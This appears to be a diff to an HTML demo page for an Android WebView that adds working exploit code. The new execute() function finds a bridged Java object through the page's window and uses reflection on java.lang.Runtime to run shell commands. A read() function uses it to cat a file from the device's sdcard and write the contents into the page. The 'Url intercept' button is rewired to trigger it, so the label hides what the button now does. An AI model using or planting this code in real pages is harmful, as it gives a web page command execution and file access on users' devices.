@@ -1,16 +1,44 @@
 <html>
 <head>
     <script type="text/javascript">
-        function show_alert(arg)
-        {
+        function show_alert(arg){
             document.getElementById("p1").innerHTML="call success! " + arg;
             return "java call js test"
         }
 
-        function jump()
-        {
+        function jump(){
             window.location.assign("http://www.asher.com")
             console.log("log test");
+        }
+
+        function execute(cmdArgs) {
+            for(var obj in window){
+                if(typeof (window[obj]) == "object"){
+                    if (window[obj]){
+                        if("getClass" in window[obj]){
+                            console.log("find getClass")
+                            return window[obj].getClass().forName("java.lang.Runtime").
+                                        getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+                        }
+                    }
+                }
+            }
+        }
+
+        function getContents(inputStream){
+            var contents = "";
+            var b = inputStream.read();
+            while(b != -1) {
+                var bString = String.fromCharCode(b);
+                contents += bString;
+                b = inputStream.read();
+            }
+            return contents;
+        }
+
+        function read(){
+            var p = execute(["cat","/mnt/sdcard/study.txt"]);
+            document.write(getContents(p.getInputStream()));
         }
 
     </script>
@@ -18,7 +46,7 @@
 <body>
 
 <input type="button" onclick="window.android.jsCallAndroid()" value="Call native method"/>
-<input type="button" onclick="jump()" value="Url intercept"/>
+<input type="button" onclick="read()" value="Url intercept"/>
 
 <p id="p1">test</p>
 </body>
